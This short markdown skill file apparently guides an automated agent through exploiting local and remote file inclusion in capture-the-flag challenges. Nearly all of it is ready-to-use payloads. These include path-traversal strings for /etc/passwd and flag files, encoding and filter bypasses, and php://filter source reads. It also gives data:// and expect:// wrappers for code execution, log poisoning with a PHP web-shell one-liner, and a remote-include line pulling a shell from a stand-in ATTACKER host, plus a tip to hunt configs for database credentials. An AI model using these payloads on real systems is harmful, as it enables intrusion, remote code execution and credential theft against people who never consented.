---
name: lfi-rfi
when: a parameter names a file/page (?file=, ?page=, ?include=, ?lang=)
tools: [http_request, shell]
phase: exploit
---
# Local/Remote file inclusion & path traversal

Start SIMPLE (one segment) before piling on:
- `?file=../flag`, `?file=../../etc/passwd`, then add `../` depth as needed.
- Absolute path: `?file=/etc/passwd`, `?file=/flag`, `?file=/root/flag.txt`, `?file=/home/*/flag`.
Bypasses: URL-encode (`%2e%2e%2f`), double-encode, null byte (`%00`, old PHP), `....//`,
strip filter with nested `..././`, wrapper `php://filter/convert.base64-encode/resource=index.php`
to read source (decode the base64 to find secrets), `data://`/`expect://` for RCE if allowed.
Log poisoning / RCE: include `/var/log/apache2/access.log` (or auth.log via SSH user `<?php system($_GET[c]);?>`),
`/proc/self/environ`, PHP session files under `/var/lib/php/sessions/`.
RFI (rare, allow_url_include=On): `?file=http://ATTACKER/shell.txt`.
Common flag locations to try directly once you have LFI: `/flag`, `/flag.txt`, `flag`, `../flag`,
config files with DB creds, `/etc/passwd` to enumerate users then their home dirs.
